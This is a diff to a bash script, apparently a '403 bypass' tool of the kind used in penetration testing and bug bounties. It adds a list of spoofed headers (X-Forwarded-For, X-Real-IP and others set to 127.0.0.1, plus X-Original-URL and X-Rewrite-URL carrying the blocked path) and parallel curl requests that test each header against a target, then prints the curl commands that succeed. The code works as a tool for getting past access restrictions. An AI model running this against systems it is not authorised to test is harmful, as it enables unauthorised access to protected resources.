@@ -13,22 +13,47 @@ default_method="GET"
 method=""
 max_jobs=5  # Adjust this to change speed (parallel requests)
 headers=()
+test_mode="url"  # Default: url encode bypass only
+
+# Header bypass array
+header_bypasses=(
+    "Client-IP: 127.0.0.1"
+    "X-Real-IP: 127.0.0.1"
+    "Redirect: 127.0.0.1"
+    "Referer: 127.0.0.1"
+    "X-Client-IP: 127.0.0.1"
+    "X-Custom-IP-Authorization: 127.0.0.1"
+    "X-Forwarded-By: 127.0.0.1"
+    "X-Forwarded-For: 127.0.0.1"
+    "X-Forwarded-Host: 127.0.0.1"
+    "X-Forwarded-Port: 80"
+    "X-True-IP: 127.0.0.1"
+    "X-Original-URL: ${pat}"
+    "X-Rewrite-URL: ${pat}"
+    "X-Original-Uri: ${pat}"
+    "X-Rewrite-Uri: ${pat}"
+    "X-Forwarded-Server: 127.0.0.1"
+    "X-Host: 127.0.0.1"
+    "X-Http-Host-Override: 127.0.0.1"
+    "X-Originating-IP: 127.0.0.1"
+    "X-Remote-Addr: 127.0.0.1"
+    "X-Remote-IP: 127.0.0.1"
+)
 
 banner() {
 
         echo -e "$cyan$BOLD
-  ______                       ___        ____  
- |  ____|                     / _ \      |___ \ 
- | |__ ___  _   _ _ __ ______| | | |______ __) |
- |  __/ _ \| | | | '__|______| | | |______|__ < 
- | | | (_) | |_| | |         | |_| |      ___) |
- |_|  \___/ \__,_|_|          \___/      |____/ 
-                                     Bypass :D $end"
-    
-    echo -e "             ${cyan}${BOLD}Coded By (mugh33ra)$NC"
-    echo -e "            ${BOLD_WHITE}https://x.com/mugh33ra"
-    echo -e "          ${BOLD_WHITE}https://github.com/mugh33ra"
-    echo ""
+  ______                 ___   ____
+ |  ____|               / _ \ |___ \
+ | |__ ___  _   _ _ __ | | | |  __) |
+ |  __/ _ \| | | | '__|| | | | |__ <
+ | | | (_) | |_| | |   | |_| | ___) |
+ |_|  \___/ \__,_|_|    \___/ |____/
+                          Bypass :D
+
+        author: @me_dheeraj
+       Enhanced By @mugh33ra$end"
+       echo ""
 }
 
 help_usage() {
@@ -37,13 +62,14 @@ help_usage() {
     echo "  -u, --url        Specify <Target_Url>"
     echo "  -m, --method     Specify Method <POST, PUT, PATCH> (Default, GET)"
     echo "  -H, --header     Add custom header (repeatable)"
+    echo "  -a, --all        Run both URL encode and header bypass tests"
     echo "  -h, --help       Display help and exit"
 }
 
 if [[ $# -eq 0 ]]; then
-        banner
-        echo "[!] Error: use -h/--help for help menu"
-        exit 1
+    banner
+    echo "[!] Error: use -h/--help for help menu"
+    exit 1
 fi
 
 while [[ $# -gt 0 ]]; do
@@ -52,6 +78,7 @@ while [[ $# -gt 0 ]]; do
             [[ -n $2 && $2 != -* ]] && {
                 target=${2%/};
                 pat=$(echo $2 | cut -d "/" -f4- );
+                base_url=$(echo $2 | cut -d "/" -f1-3);
                 shift 2;
             } || { echo "[!] Url is missing"; exit 1; } ;;
         -m|--method)
@@ -61,6 +88,9 @@ while [[ $# -gt 0 ]]; do
                 headers+=("-H" "$2")
                 shift 2
             } || { echo "[!] Header missing"; exit 1; } ;;
+        -a|--all)
+            test_mode="all"
+            shift ;;
         -h|--help)
             banner; help_usage; exit 0; shift ;;
         *) echo "[!] Unknown flag $1"; exit 1 ;;
@@ -109,9 +139,54 @@ run_check() {
     fi
 }
 
-encode_bypass() {
+run_header_check() {
+    local header="$1"
+    local current_header=$(echo "$header" | sed "s|\${pat}|$pat|g")
 
-    banner
+    # For X-Original-URL type headers, we need to remove the path from target
+    if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
+        local test_url="${base_url}/"
+        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
+    else
+        local test_url="${target}"
+        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
+    fi
+
+    local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
+        -o /dev/null -w "%{http_code}|%{size_download}" \
+        "$test_url" -X "$method" -H "User-Agent: Mozilla/5.0")
+
+    local st=$(echo "$res" | cut -d'|' -f1)
+    local len=$(echo "$res" | cut -d'|' -f2)
+
+    if [[ "$st" =~ ^2 ]]; then
+        color="${green}"
+    elif [[ "$st" =~ ^3 ]]; then
+        color="${yellow}"
+    elif [[ "$st" =~ ^4 ]]; then
+        color="${red}"
+    else
+        color="${cyan}"
+    fi
+
+    echo -e "Header [ ${yellow}${current_header}${end} ]: ${color}Status: $st, Length : $len${end}"
+
+    if [[ "$st" =~ ^2 ]]; then
+        local line=$(printf '%.0s─' $(seq 1 $((termwidth - 2))))
+        echo -e "╭${line}╮"
+        echo -e " Header [ ${yellow}${current_header}${end} ]:"
+        echo -e " METHOD: '${cyan}${method}${end}'"
+        if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
+            echo -e " URL: '${cyan}${base_url}/${end}'"
+        else
+            echo -e " URL: '${cyan}${target}${end}'"
+        fi
+        echo -e " COMMAND: ${cyan}curl -k -s -X $method '${test_url}' ${headers[*]} -H '$current_header' -H 'User-Agent: Mozilla/5.0'${end}"
+        echo -e "╰${line}╯"
+    fi
+}
+
+encode_bypass() {
     echo -e "${blue}----------------------${end}"
     echo -e "${cyan}[+] URL Encode Bypass (Parallel)${end}"
     echo -e "${blue}----------------------${end}"
@@ -131,4 +206,34 @@ encode_bypass() {
     set +f
 }
 
-encode_bypass
+header_bypass() {
+    echo -e "${blue}----------------------${end}"
+    echo -e "${cyan}[+] Header Bypass (Parallel)${end}"
+    echo -e "${blue}----------------------${end}"
+
+    for header in "${header_bypasses[@]}"; do
+        [[ -z "$header" ]] && continue
+
+        run_header_check "$header" &
+
+        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
+            wait -n
+        fi
+    done
+
+    wait
+}
+
+main() {
+    if [[ "$test_mode" == "url" ]]; then
+        banner        # Show banner here
+        encode_bypass # No banner inside this function
+    elif [[ "$test_mode" == "all" ]]; then
+        banner        # Show banner once
+        encode_bypass # No banner inside
+        echo ""
+        header_bypass
+    fi
+}
+
+main
